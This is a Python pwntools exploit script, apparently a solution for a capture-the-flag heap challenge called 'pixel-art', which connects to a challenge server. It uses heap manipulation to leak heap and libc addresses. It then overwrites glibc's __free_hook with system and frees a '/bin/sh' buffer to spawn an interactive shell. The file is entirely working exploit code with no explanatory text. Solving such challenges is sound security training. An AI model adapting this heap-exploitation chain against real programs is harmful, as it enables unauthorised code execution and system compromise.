#!/usr/bin/env python3

from pwn import *

exe = ELF("./pixel-art_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("server.challenge.ctf.thefewchosen.com", 1344)

def start(width, height):
    r.sendlineafter("Width of image: ", str(width))
    r.sendlineafter("Height of image: ", str(height))

def sl(data):
    r.sendlineafter("> ", data)

def alloc(row, column, size, data):
    r.recv()
    r.sendline("1")
    sl(str(row))
    sl(str(column))
    sl(str(size))
    if data:
        sl(data)

def free(row, column):
    r.recv()
    r.sendline("2")
    sl(str(row))
    sl(str(column))

def edit(row, column, data):
    r.recv()
    r.sendline("3")
    sl(str(row))
    sl(str(column))
    sl(data)

def show():
    r.recv()
    r.sendline("4")

def main():
    
    pause()
    start(30, 30)
    for i in range(9):
        alloc(0, i, 0x18, "MAHER")

    for i in range(9):
        free(0, i) 
    
    for i in range(7):
        alloc(0, i, 0x18, "MAHER")
   
    alloc(0, 9, 0x180, "")
    show()
    for _ in range(13):
        r.recvline()
    r.recv(5)

    heap_leak = u64(r.recv(6).ljust(8, p8(0)))
    log.info("Heap leak @ 0x%x", heap_leak)
    heap_base = heap_leak - 0x33f0
    log.info("Heap base @ 0x%x", heap_base)
    
    alloc(0, 10, 0x18, "MAHER")
    alloc(0, 11, 0x18, "MAHER")

    # head
    alloc(0, 10, 0x31, p64(0) + p64(0x4e1))
    for _ in range(14 - 2):
        alloc(0, i, 0x31, chr(ord("A") + _)*0x30)
    # tail
    alloc(0, 10, 0x31, (p64(0) + p64(0x21)) * 3)

    to_free = heap_base + 0x34d0
    
    alloc(0, 0, 10, "LOL")
    alloc(0, 1, 0x30, "MAHER")
    free(0, 0)
    free(0, 1)
    
    alloc(0, 1, 0x10, p64(0) + p64(to_free))
    free(0, 0)
        
    alloc(0, 2, 10, "lol")
    alloc(0, 0, 10, "MAHER")
    alloc(0, 1, 0x30, "lol")

    free(0, 0)
    free(0, 1)
    
    libc_place = heap_base + 0x3530

    alloc(0, 1, 0x11, p64(0) + p64(libc_place))
    show()
    libc_leak = u64(r.recvuntil(p8(0x7f))[-6::].ljust(8, p8(0)))
    log.warn("Libc leak @ 0x%x", libc_leak)
    libc.address = libc_leak - 0x1ebbe0
    log.warn("Libc base @ 0x%x", libc.address)
    
    alloc(0, 0, 10, "MAHER")
    alloc(0, 1, 0x30, "lol")

    free(0, 0)
    free(0, 1)
    
    alloc(0, 1, 0x11, p64(0) + p64(heap_base + 0xa0))
    edit(0, 0, p64(libc.sym["__free_hook"]))
    alloc(0, 0, 0x31, p64(libc.sym['system']))
    alloc(0, 1, 0x10, "/bin/sh\x00")
    
    free(0, 1)

    r.interactive()


if __name__ == "__main__":
    main()
